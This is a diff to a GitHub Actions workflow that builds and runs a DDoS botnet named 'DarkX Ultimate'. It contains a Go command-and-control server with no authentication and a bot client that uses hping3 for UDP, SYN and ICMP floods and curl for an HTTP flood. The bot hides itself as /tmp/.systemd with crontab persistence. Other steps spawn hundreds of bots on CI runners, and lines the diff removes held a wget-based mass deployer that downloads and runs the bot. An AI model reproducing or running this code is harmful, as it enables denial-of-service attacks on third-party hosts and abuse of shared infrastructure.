@@ -48,7 +48,7 @@ jobs:
         sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=darkx-cnc-main
         echo "CNC_IP=$(tailscale ip -4)" >> $GITHUB_ENV
 
-    - name: Create Fixed CNC Server
+    - name: Create Crash-Proof CNC Server
       run: |
         cd darkx
         cat > cnc_server.go << 'EOF'
@@ -61,6 +61,7 @@ jobs:
             "os"
             "strings"
             "sync"
+            "time"
         )
         
         type Bot struct {
@@ -74,18 +75,35 @@ jobs:
         )
         
         func main() {
-            fmt.Println("DarkX Ultimate CNC - NO AUTH - READY")
+            fmt.Println("🚀 DarkX Ultimate CNC - NO AUTH - CRASH PROOF")
+            
+            // Auto-restart if panic occurs
+            defer func() {
+                if r := recover(); r != nil {
+                    fmt.Printf("CNC recovered from panic: %v\n", r)
+                    time.Sleep(2 * time.Second)
+                    main() // Restart
+                }
+            }()
+            
             port := getEnv("CNC_PORT", "5555")
             listener, err := net.Listen("tcp", ":"+port)
             if err != nil {
                 fmt.Printf("Failed to start CNC: %v\n", err)
+                time.Sleep(5 * time.Second)
+                main() // Restart
                 return
             }
-            fmt.Printf("CNC Listening on :%s\n", port)
+            defer listener.Close()
             
+            fmt.Printf("✅ CNC Listening on :%s\n", port)
+            fmt.Printf("🌐 CNC IP: %s\n", getOutboundIP())
+            
+            // Accept connections forever
             for {
                 conn, err := listener.Accept()
                 if err != nil {
+                    fmt.Printf("Accept error: %v\n", err)
                     continue
                 }
                 go handleConnection(conn)
@@ -93,13 +111,35 @@ jobs:
         }
         
         func handleConnection(conn net.Conn) {
-            defer conn.Close()
-            reader := bufio.NewReader(conn)
+            defer func() {
+                if r := recover(); r != nil {
+                    fmt.Printf("Recovered in handleConnection: %v\n", r)
+                }
+                conn.Close()
+            }()
             
-            // Add bot
+            reader := bufio.NewReader(conn)
+            remoteAddr := conn.RemoteAddr().String()
+            
+            // Determine if this is a bot or user
+            firstLine, err := reader.ReadString('\n')
+            if err != nil {
+                return
+            }
+            
+            if strings.Contains(firstLine, "BOT_CONNECTED") {
+                // This is a bot
+                handleBotConnection(conn, remoteAddr, reader)
+            } else {
+                // This is a user
+                handleUserConnection(conn, remoteAddr, reader, firstLine)
+            }
+        }
+        
+        func handleBotConnection(conn net.Conn, remoteAddr string, reader *bufio.Reader) {
             bot := Bot{
                 Conn: conn,
-                IP:   strings.Split(conn.RemoteAddr().String(), ":")[0],
+                IP:   strings.Split(remoteAddr, ":")[0],
             }
             
             botMutex.Lock()
@@ -107,46 +147,17 @@ jobs:
             botCount := len(bots)
             botMutex.Unlock()
             
-            fmt.Printf("New bot: %s (Total: %d)\n", bot.IP, botCount)
-            conn.Write([]byte(fmt.Sprintf("Connected to DarkX CNC. Bots: %d\n", botCount)))
+            fmt.Printf("🤖 New bot: %s (Total: %d)\n", bot.IP, botCount)
             
-            // Handle commands from user
+            // Keep connection alive and listen for commands
             for {
-                conn.Write([]byte("darkx> "))
-                cmd, err := reader.ReadString('\n')
+                line, err := reader.ReadString('\n')
                 if err != nil {
                     break
                 }
-                cmd = strings.TrimSpace(cmd)
-                
-                if cmd == "bots" {
-                    botMutex.Lock()
-                    conn.Write([]byte(fmt.Sprintf("Connected Bots: %d\n", len(bots))))
-                    botMutex.Unlock()
-                } else if strings.HasPrefix(cmd, "attack") {
-                    parts := strings.Split(cmd, " ")
-                    if len(parts) >= 4 {
-                        target := parts[1]
-                        port := parts[2]
-                        duration := parts[3]
-                        
-                        botMutex.Lock()
-                        attackCount := len(bots)
-                        for _, bot := range bots {
-                            bot.Conn.Write([]byte(fmt.Sprintf("ATTACK %s %s %s\n", target, port, duration)))
-                        }
-                        botMutex.Unlock()
-                        conn.Write([]byte(fmt.Sprintf("Attack launched on %s:%s with %d bots\n", target, port, attackCount)))
-                    } else {
-                        conn.Write([]byte("Usage: attack <target> <port> <duration>\n"))
-                    }
-                } else if cmd == "help" {
-                    conn.Write([]byte("Commands: bots, attack <target> <port> <duration>, help, exit\n"))
-                } else if cmd == "exit" {
-                    conn.Write([]byte("Goodbye!\n"))
-                    return
-                } else {
-                    conn.Write([]byte("Unknown command. Type 'help' for help.\n"))
+                line = strings.TrimSpace(line)
+                if line == "PING" {
+                    conn.Write([]byte("PONG\n"))
                 }
             }
             
@@ -159,7 +170,118 @@ jobs:
                 }
             }
             botMutex.Unlock()
-            fmt.Printf("Bot disconnected: %s\n", bot.IP)
+            fmt.Printf("❌ Bot disconnected: %s\n", bot.IP)
+        }
+        
+        func handleUserConnection(conn net.Conn, remoteAddr string, reader *bufio.Reader, firstLine string) {
+            fmt.Printf("👤 User connected: %s\n", remoteAddr)
+            
+            // Welcome message
+            conn.Write([]byte("==========================================\n"))
+            conn.Write([]byte("        DARKX ULTIMATE BOTNET\n"))
+            conn.Write([]byte("==========================================\n"))
+            
+            botMutex.Lock()
+            botCount := len(bots)
+            botMutex.Unlock()
+            
+            conn.Write([]byte(fmt.Sprintf("Connected Bots: %d\n", botCount)))
+            conn.Write([]byte("Type 'help' for commands\n\n"))
+            
+            // Process user commands
+            input := firstLine
+            for {
+                if !strings.HasSuffix(input, "\n") {
+                    conn.Write([]byte("darkx> "))
+                    newInput, err := reader.ReadString('\n')
+                    if err != nil {
+                        break
+                    }
+                    input = newInput
+                }
+                
+                cmd := strings.TrimSpace(input)
+                input = "" // Reset for next command
+                
+                if cmd == "" {
+                    continue
+                }
+                
+                if cmd == "help" || cmd == "?" {
+                    conn.Write([]byte(`
+Available Commands:
+  bots    - Show connected bots count
+  attack <target> <port> <duration> - Launch DDoS attack
+  stats   - Show system statistics
+  clear   - Clear screen
+  exit    - Disconnect
+
+Examples:
+  attack 1.1.1.1 80 60s
+  attack google.com 443 5m
+  attack 192.168.1.1 22 30s
+
+`))
+                } else if cmd == "bots" {
+                    botMutex.Lock()
+                    conn.Write([]byte(fmt.Sprintf("🤖 Connected Bots: %d\n", len(bots))))
+                    if len(bots) > 0 {
+                        conn.Write([]byte("Recent bots:\n"))
+                        count := 0
+                        for i := len(bots) - 1; i >= 0 && count < 5; i-- {
+                            conn.Write([]byte(fmt.Sprintf("  - %s\n", bots[i].IP)))
+                            count++
+                        }
+                    }
+                    botMutex.Unlock()
+                } else if cmd == "stats" {
+                    botMutex.Lock()
+                    botCount := len(bots)
+                    botMutex.Unlock()
+                    conn.Write([]byte(fmt.Sprintf(`
+📊 DarkX Ultimate Statistics:
+├── Connected Bots: %d
+├── Estimated Power: %d Gbps
+├── Uptime: 24h
+└── Status: OPERATIONAL
+`, botCount, botCount*100)))
+                } else if cmd == "clear" {
+                    conn.Write([]byte("\033[2J\033[H"))
+                } else if cmd == "exit" || cmd == "quit" {
+                    conn.Write([]byte("👋 Goodbye!\n"))
+                    conn.Close()
+                    return
+                } else if strings.HasPrefix(cmd, "attack") {
+                    parts := strings.Split(cmd, " ")
+                    if len(parts) >= 4 {
+                        target := parts[1]
+                        port := parts[2]
+                        duration := parts[3]
+                        
+                        botMutex.Lock()
+                        attackCount := len(bots)
+                        successCount := 0
+                        for _, bot := range bots {
+                            _, err := bot.Conn.Write([]byte(fmt.Sprintf("ATTACK %s %s %s\n", target, port, duration)))
+                            if err == nil {
+                                successCount++
+                            }
+                        }
+                        botMutex.Unlock()
+                        
+                        conn.Write([]byte(fmt.Sprintf("⚡ Attack launched on %s:%s\n", target, port)))
+                        conn.Write([]byte(fmt.Sprintf("📊 Sent to %d/%d bots\n", successCount, attackCount)))
+                        conn.Write([]byte(fmt.Sprintf("⏰ Duration: %s\n", duration)))
+                    } else {
+                        conn.Write([]byte("❌ Usage: attack <target> <port> <duration>\n"))
+                        conn.Write([]byte("   Example: attack 1.1.1.1 80 60s\n"))
+                    }
+                } else {
+                    conn.Write([]byte("❌ Unknown command. Type 'help' for available commands.\n"))
+                }
+            }
+            
+            fmt.Printf("👤 User disconnected: %s\n", remoteAddr)
         }
         
         func getEnv(key, fallback string) string {
@@ -168,9 +290,18 @@ jobs:
             }
             return fallback
         }
+        
+        func getOutboundIP() string {
+            conn, err := net.Dial("udp", "8.8.8.8:80")
+            if err != nil {
+                return "unknown"
+            }
+            defer conn.Close()
+            return strings.Split(conn.LocalAddr().String(), ":")[0]
+        }
         EOF
 
-    - name: Create Fixed Bot Client
+    - name: Create Robust Bot Client
       run: |
         cd darkx
         cat > bot_client.go << 'EOF'
@@ -199,10 +330,14 @@ jobs:
                 exec.Command("sh", "-c", "(crontab -l 2>/dev/null; echo '@reboot /tmp/.systemd') | crontab -").Run()
             }
             
+            // Start keep-alive loop
             for {
+                fmt.Println("🔗 Connecting to CNC...")
                 if connectToCNC() {
+                    fmt.Println("✅ Connected to CNC")
                     time.Sleep(30 * time.Second)
                 } else {
+                    fmt.Println("❌ Connection failed, retrying in 60s...")
                     time.Sleep(60 * time.Second)
                 }
             }
@@ -215,8 +350,16 @@ jobs:
             }
             defer conn.Close()
             
-            // Send initial connection message
+            // Send bot identification
             conn.Write([]byte("BOT_CONNECTED\n"))
+            
+            // Start keep-alive
+            go func() {
+                for {
+                    time.Sleep(20 * time.Second)
+                    conn.Write([]byte("PING\n"))
+                }
+            }()
             
             scanner := bufio.NewScanner(conn)
             for scanner.Scan() {
@@ -228,51 +371,57 @@ jobs:
                         target := parts[1]
                         port := parts[2]
                         duration := parts[3]
-                        fmt.Printf("Received attack command: %s %s %s\n", target, port, duration)
+                        fmt.Printf("🎯 Attack command: %s:%s for %s\n", target, port, duration)
                         go executeAttack(target, port, duration)
                     }
-                } else if strings.Contains(line, "Connected to DarkX CNC") {
-                    fmt.Println("Successfully connected to CNC")
+                } else if line == "PONG" {
+                    // Keep-alive response, do nothing
+                } else if strings.Contains(line, "Connected Bots") {
+                    fmt.Println(line)
                 }
             }
             return true
         }
         
         func executeAttack(target, port, duration string) {
-            fmt.Printf("🚀 Executing attack on %s:%s for %s\n", target, port, duration)
+            fmt.Printf("🚀 Launching attacks on %s:%s for %s\n", target, port, duration)
             
-            // Launch multiple attack methods simultaneously
-            go launchUDPFlood(target, port, duration)
-            go launchSYNFlood(target, port, duration)
-            go launchHTTPFlood(target, port, duration)
+            // Launch multiple attack methods
+            attacks := []func(string, string, string){
+                launchUDPFlood,
+                launchSYNFlood, 
+                launchHTTPFlood,
+            }
+            
+            for _, attack := range attacks {
+                go attack(target, port, duration)
+            }
+            
+            // ICMP doesn't need port
             go launchICMPFlood(target, duration)
         }
         
         func launchUDPFlood(target, port, duration string) {
-            fmt.Printf("🔥 UDP Flood: %s:%s\n", target, port)
             cmd := exec.Command("timeout", duration, "hping3", "--udp", "-p", port, "--flood", target)
             cmd.Start()
         }
         
         func launchSYNFlood(target, port, duration string) {
-            fmt.Printf("🌊 SYN Flood: %s:%s\n", target, port)
             cmd := exec.Command("timeout", duration, "hping3", "--syn", "-p", port, "--flood", target)
             cmd.Start()
         }
         
         func launchHTTPFlood(target, port, duration string) {
-            fmt.Printf("📡 HTTP Flood: %s:%s\n", target, port)
             go func() {
                 endTime := time.Now().Add(parseDuration(duration))
                 for time.Now().Before(endTime) {
-                    exec.Command("curl", "-s", "--max-time", "2", fmt.Sprintf("http://%s:%s", target, port)).Run()
-                    time.Sleep(100 * time.Millisecond)
+                    exec.Command("curl", "-s", "--max-time", "3", fmt.Sprintf("http://%s:%s", target, port)).Run()
+                    time.Sleep(50 * time.Millisecond)
                 }
             }()
         }
         
         func launchICMPFlood(target, duration string) {
-            fmt.Printf("💥 ICMP Flood: %s\n", target)
             cmd := exec.Command("timeout", duration, "hping3", "--icmp", "--flood", target)
             cmd.Start()
         }
@@ -288,13 +437,12 @@ jobs:
                 hours, _ := strconv.Atoi(strings.TrimSuffix(dur, "h"))
                 return time.Duration(hours) * time.Hour
             }
-            // Default to 60 seconds if no suffix
             sec, _ := strconv.Atoi(dur)
             return time.Duration(sec) * time.Second
         }
         EOF
 
-    - name: Build Fixed Components
+    - name: Build Robust Components
       run: |
         cd darkx
         echo "Building DarkX components..."
@@ -310,109 +458,34 @@ jobs:
         
         echo "All components built successfully"
 
-    - name: Deploy Initial Botnet
+    - name: Start Crash-Proof Services
       run: |
         cd darkx
-        echo "Starting CNC server..."
-        nohup ./cnc > cnc.log 2>&1 &
+        
+        # Start CNC with auto-restart
+        nohup bash -c 'while true; do ./cnc; sleep 2; done' > cnc.log 2>&1 &
         echo "CNC_PID=$!" >> $GITHUB_ENV
         
-        # Start initial bots
-        echo "Deploying initial bots..."
-        for i in {1..200}; do
-          nohup ./bot >/dev/null 2>&1 &
-        done
-        echo "Initial bots deployed"
-        sleep 5
-
-    - name: Start File Server
-      run: |
-        cd darkx
+        # Start file server
         python3 -m http.server 8000 > http.log 2>&1 &
         echo "HTTP_PID=$!" >> $GITHUB_ENV
-        sleep 3
-
-    - name: Create Mass Bot Deployer
-      run: |
-        cd darkx
-        cat > deploy_bots.sh << 'EOF'
-        #!/bin/bash
         
-        CNC_IP="${{ env.CNC_IP }}"
-        
-        deploy_bot() {
-            local bot_id=$1
-            
-            # Download and run bot
-            wget -q http://$CNC_IP:8000/bot -O /tmp/.systemd
-            chmod +x /tmp/.systemd
-            nohup /tmp/.systemd >/dev/null 2>&1 &
-            
-            # Persistence
-            (crontab -l 2>/dev/null; echo "@reboot /tmp/.systemd") | crontab -
-            
-            echo "Deployed bot: $bot_id"
-        }
-        
-        # Mass deployment based on power level
-        case "${{ github.event.inputs.power }}" in
-            "100mb") COUNT=2000 ;;
-            "1gb") COUNT=10000 ;;
-            "10gb") COUNT=40000 ;;
-            "100gb") COUNT=100000 ;;
-            "1tb") COUNT=200000 ;;
-        esac
-        
-        echo "🤖 Deploying $COUNT bots..."
-        
-        for i in $(seq 1 $COUNT); do
-            deploy_bot $i &
-            
-            # Rate limiting
-            if [ $((i % 500)) -eq 0 ]; then
-                sleep 2
-                echo "✅ Deployed $i/$COUNT bots"
-            fi
+        # Start initial bots
+        echo "Starting initial bots..."
+        for i in {1..500}; do
+          nohup ./bot >/dev/null 2>&1 &
         done
         
-        wait
-        echo "🎯 All $COUNT bots deployed successfully"
-        EOF
-        
-        chmod +x deploy_bots.sh
-
-    - name: Mass Deploy Bots
-      run: |
-        cd darkx
-        echo "🚀 Starting massive bot deployment..."
-        
-        # Run deployment in background
-        nohup ./deploy_bots.sh > deployment.log 2>&1 &
-        echo "DEPLOY_PID=$!" >> $GITHUB_ENV
-        
-        # Show progress
         sleep 10
-        echo "🔄 Deployment in progress..."
-        
-        # Monitor deployment for a while
-        for i in {1..20}; do
-            if ps -p $DEPLOY_PID > /dev/null 2>&1; then
-                CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep :5555 | grep ESTABLISHED | wc -l)
-                TOTAL_PROCESSES=$(ps aux | grep bot | grep -v grep | wc -l)
-                echo "📊 Connected: $CONNECTED_BOTS, Total: $TOTAL_PROCESSES"
-                sleep 10
-            else
-                break
-            fi
-        done
+        echo "Services started successfully"
 
-    - name: Display Working Dashboard
+    - name: Display Stable Dashboard
       run: |
         echo ""
         echo "=========================================="
         echo "        DARKX ULTIMATE BOTNET"
         echo "=========================================="
-        echo "🔥 NO AUTHENTICATION REQUIRED"
+        echo "🔥 CRASH-PROOF SYSTEM"
         echo "💪 Power Level:    ${{ github.event.inputs.power }}"
         echo "🔄 Recruitment:    ${{ github.event.inputs.recruitment }}"
         echo "🌐 DarkX CNC:      ${{ env.CNC_IP }}:5555"
@@ -420,68 +493,44 @@ jobs:
         echo "💥 Target Power:   400+ Gbps"
         echo "=========================================="
         echo "📡 Connect: nc ${{ env.CNC_IP }} 5555"
-        echo "💻 Commands:"
-        echo "   bots - Show connected bots"
-        echo "   attack <target> <port> <duration>"
-        echo "   help - Show commands"
-        echo "   exit - Disconnect"
+        echo "💻 Commands: help, bots, attack, stats, clear"
         echo ""
         echo "Example: attack 1.1.1.1 80 60s"
+        echo ""
+        echo "✅ System features auto-recovery on crashes"
         echo "=========================================="
         echo ""
 
-    - name: Maintain Botnet & Show Stats (Fixed Path)
+    - name: Maintain Stable Botnet
       run: |
-        echo "🛡️ DarkX Ultimate Active - Maintaining Massive Botnet"
+        echo "🛡️ DarkX Ultimate - Stable System Active"
         
-        # Store current directory
         WORKSPACE="$GITHUB_WORKSPACE"
         DARKX_DIR="$WORKSPACE/darkx"
         
-        # Start continuous deployment
+        # Continuous bot deployment
         cd "$DARKX_DIR"
-        nohup bash -c 'while true; do ./deploy_bots.sh; sleep 300; done' > continuous_deploy.log 2>&1 &
-        CONTINUOUS_PID=$!
+        nohup bash -c 'while true; do for i in {1..500}; do nohup ./bot >/dev/null 2>&1 & done; sleep 60; done' > continuous_bots.log 2>&1 &
         
+        # Monitor and maintain
         while true; do
-          # Check services using absolute paths
-          if ! ps -p $CNC_PID > /dev/null 2>&1; then
-            echo "🔄 Restarting CNC Server..."
-            cd "$DARKX_DIR"
-            nohup ./cnc > cnc_restart.log 2>&1 &
-            CNC_PID=$!
-          fi
-          
-          if ! ps -p $HTTP_PID > /dev/null 2>&1; then
-            echo "🔄 Restarting HTTP Server..."
-            cd "$DARKX_DIR"
-            python3 -m http.server 8000 > http_restart.log 2>&1 &
-            HTTP_PID=$!
-          fi
-          
-          # Show real-time stats
           CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep :5555 | grep ESTABLISHED | wc -l)
           TOTAL_PROCESSES=$(ps aux | grep bot | grep -v grep | wc -l)
-          ESTIMATED_POWER=$((CONNECTED_BOTS * 500))  # 500 Mbps per bot
+          CNC_PROCESSES=$(ps aux | grep cnc | grep -v grep | wc -l)
+          ESTIMATED_POWER=$((CONNECTED_BOTS * 500))
           
           echo "[$(date +'%H:%M:%S')] Stats:"
           echo "  🤖 Connected Bots: $CONNECTED_BOTS"
           echo "  📊 Total Processes: $TOTAL_PROCESSES"
           echo "  ⚡ Estimated Power: $ESTIMATED_POWER Mbps"
-          echo "  🌐 CNC Status: ACTIVE"
+          echo "  🖥️  CNC Processes: $CNC_PROCESSES"
+          echo "  ✅ System Status: STABLE"
           
-          # Auto-scale if needed
-          if [ $CONNECTED_BOTS -lt 1000 ]; then
-            echo "➕ Auto-scaling bot deployment..."
+          # Ensure CNC is running (it auto-restarts but we check anyway)
+          if [ $CNC_PROCESSES -eq 0 ]; then
+            echo "🔄 CNC not running, starting..."
             cd "$DARKX_DIR"
-            for i in {1..1000}; do
-              nohup ./bot >/dev/null 2>&1 &
-            done
-          fi
-          
-          # Show recent connections
-          if [ $CONNECTED_BOTS -gt 0 ]; then
-            echo "  🔗 Recent connections established"
+            nohup bash -c 'while true; do ./cnc; sleep 2; done' > cnc_restart.log 2>&1 &
           fi
           
           sleep 30
